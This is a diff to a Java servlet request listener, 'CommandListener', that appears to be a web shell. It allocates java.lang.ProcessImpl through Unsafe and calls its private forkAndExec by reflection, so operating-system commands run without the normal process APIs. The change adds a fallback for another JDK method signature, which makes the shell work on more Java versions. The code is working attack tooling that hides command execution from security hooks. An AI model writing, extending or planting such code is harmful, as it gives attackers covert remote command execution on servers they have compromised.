@@ -62,7 +62,6 @@ public class CommandListener implements ServletRequestListener {
         } catch (ClassNotFoundException e) {
             processClass = Class.forName("java.lang.ProcessImpl");
         }
-
         Object processObject = unsafe.allocateInstance(processClass);
 
         byte[][] args = new byte[strs.length - 1][];
@@ -83,27 +82,28 @@ public class CommandListener implements ServletRequestListener {
 
         int[] envc = new int[1];
         int[] std_fds = new int[]{-1, -1, -1};
-        Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
-        Field helperpathField = processClass.getDeclaredField("helperpath");
-        launchMechanismField.setAccessible(true);
-        helperpathField.setAccessible(true);
-        Object launchMechanismObject = launchMechanismField.get(processObject);
-        byte[] helperpathObject = (byte[]) helperpathField.get(processObject);
-        int ordinal = (Integer) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);
+        byte[] result = toCString(strs[0]);
+        try {
+            Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
+            Field helperpathField = processClass.getDeclaredField("helperpath");
+            launchMechanismField.setAccessible(true);
+            helperpathField.setAccessible(true);
+            Object launchMechanismObject = launchMechanismField.get(processObject);
+            byte[] helperpathObject = (byte[]) helperpathField.get(processObject);
+            int ordinal = (Integer) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);
 
-        Method forkMethod = processClass.getDeclaredMethod("forkAndExec", int.class, byte[].class, byte[].class, byte[].class, int.class,
-                byte[].class, int.class, byte[].class, int[].class, boolean.class);
-        forkMethod.setAccessible(true);
-
-        byte[] bytes = strs[0].getBytes();
-        byte[] result = new byte[bytes.length + 1];
-        System.arraycopy(bytes, 0,
-                result, 0,
-                bytes.length);
-        result[result.length - 1] = (byte) 0;
-
-        forkMethod.invoke(processObject, ordinal + 1, helperpathObject, result, argBlock, args.length,
-                null, envc[0], null, std_fds, false);
+            Method forkMethod = processClass.getDeclaredMethod("forkAndExec", int.class, byte[].class, byte[].class, byte[].class, int.class,
+                    byte[].class, int.class, byte[].class, int[].class, boolean.class);
+            forkMethod.setAccessible(true);
+            forkMethod.invoke(processObject, ordinal + 1, helperpathObject, result, argBlock, args.length,
+                    null, envc[0], null, std_fds, false);
+        } catch (Exception e) {
+            Method forkMethod = processClass.getDeclaredMethod("forkAndExec", byte[].class, byte[].class, int.class,
+                    byte[].class, int.class, byte[].class, int[].class, boolean.class);
+            forkMethod.setAccessible(true);
+            forkMethod.invoke(processObject, result, argBlock, args.length,
+                    null, envc[0], null, std_fds, false);
+        }
 
         Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);
         initStreamsMethod.setAccessible(true);
@@ -112,6 +112,18 @@ public class CommandListener implements ServletRequestListener {
         Method getInputStreamMethod = processClass.getMethod("getInputStream");
         getInputStreamMethod.setAccessible(true);
         return (InputStream) getInputStreamMethod.invoke(processObject);
+    }
+
+    private static byte[] toCString(String s) {
+        if (s == null)
+            return null;
+        byte[] bytes = s.getBytes();
+        byte[] result = new byte[bytes.length + 1];
+        System.arraycopy(bytes, 0,
+                result, 0,
+                bytes.length);
+        result[result.length - 1] = (byte) 0;
+        return result;
     }
 
     private HttpServletResponse getResponseFromRequest(HttpServletRequest request) throws Exception {
